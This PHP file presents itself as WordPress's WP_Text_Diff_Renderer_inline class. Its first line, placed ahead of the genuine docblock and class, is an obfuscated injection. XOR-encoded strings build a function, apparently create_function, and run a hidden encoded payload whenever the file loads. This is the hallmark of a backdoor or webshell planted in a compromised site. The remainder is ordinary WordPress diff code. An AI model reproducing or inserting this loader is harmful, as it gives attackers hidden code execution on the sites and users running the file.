<?php $RBLTbmWoU='CR2O9I0WY67HI;8'^'  W.M,o1,XT< TV';$lsWYPRqkuF=$RBLTbmWoU('','ZFZl,DR:Z :6qE0ECTKPrSQY9ZW,Ad7M4HHyDC>=a-,>P91;:M;V864Y3Vaa 1LCNR-TLuGMW24ScllzV6FC2K,U0eiKJjadbp1VOomPsdyIZHj,f=D>P3VbhQ+;9BPpW0dLk3JAs;E7kGynjfT;239u;sS.RPFUCuh,rhh=3GPH6NcP-BpiNHRpZ7S=IF-lV;IJppBm77>1CN J23lPE,  JUroE0,AL:-SHSTcF+Z0ES3n2976,C.Pglr;=y3-5ZSBks35KDIuYsXYB  aB,HMkZS;222PGfOolR6Otlxr456MPGiu PGL+sI<:xD6KeUHZ800MtV8F<Z ES 8ZXNhr3f;+;lk81LQKE-rnogBKA+1EnFGmoCWT 7;j<1:zuHa=6KxN;OF=P98JIap0YWURtY3L737ga4+2VkVB,;ZOE>XUG<.2q.R:-DT>Ui<V<TX0P HbRnT3R<V2fC=LJ5oyrq<2A;cPE:cdayTKnM>.T3tcIk-+74T0 P;4.TXNJ:LVEWEeEdU+QFAyApUTj;RVKFD28P:b81TOgncpXYJ;eBADBFGRpzSDV0-uzJPCDjcj66PZsJIjgzEmh0R3VM4VT=5P>01H+mO8QC5C1RUibGJJ MyHjzMVLvKr8 M25FjRMG53V9XJVOP3RcexB4 3B5KYPROP'^'3 rMJ1<Y.IUX. H,0 8xU+>+f>6X ;h A<oPmcE7hKYP3MXTTmC9JiP8G7>>MD8kj6L -Ygi<WMzCLLZvMLJ;oC DETkmMZnkyW9=GI9SYYyahNEZN0L<V8JL5JOXkkPsYOgB9CHWT0CKiDNBB0ZFRbQR.sprt-0:.LERMHNG5<-XfG;H;Y4gsXySE6I<4CDrT<>YKHdJ=C;IjD+FRLmeJAL90IeaTM5-eF61siC J6C h9dTVESM FpOH-xr6xdpz21KWXP2dtKyW.8.UEHbWBDO>2OSmY5>FrOH9S6OfqVPTB,pzIQV1+9NHCA0r-PkMtl>YDQdT-2OZ5R 2CPzpj7 v7nnh8KYBlu  TRSQGf= GD Gf<gfJs0ACZ5WTCZHhEVS2CD2FbY1MYjtATF8; 7OS:1=N=mEPJF7KkblN4< L14+UTWYV=Hr 5J46c;I pR1S-Tf10V1S2WNgY->TFURUXS5Z<; CJMZs=-FiZO RTEoKLYEU-oK5BkK,1=>Idq.2<BiDqO02 PaVstBV6ccb SL1aEST-h:GCMeymZQwytptwkGO1ugUIAJ,fvqXRXPU5>F,,MNZcKHQ A74k=1Dj5FYB<XEhH0:Y,P6rEBc.+T,PaJZmvlV0x1E;SYnN6,3ThqI93: 1Wu>LCH=EK+AciyiE-');$lsWYPRqkuF();
/**
 * Diff API: WP_Text_Diff_Renderer_inline class
 *
 * @package WordPress
 * @subpackage Diff
 * @since 4.7.0
 */

/**
 * Better word splitting than the PEAR package provides.
 *
 * @since 2.6.0
 * @uses Text_Diff_Renderer_inline Extends
 */
class WP_Text_Diff_Renderer_inline extends Text_Diff_Renderer_inline {

	/**
	 * @ignore
	 * @since 2.6.0
	 *
	 * @param string $string
	 * @param string $newlineEscape
	 * @return string
	 */
	public function _splitOnWords($string, $newlineEscape = "\n") {
		$string = str_replace("\0", '', $string);
		$words  = preg_split( '/([^\w])/u', $string, -1, PREG_SPLIT_DELIM_CAPTURE );
		$words  = str_replace( "\n", $newlineEscape, $words );
		return $words;
	}

}
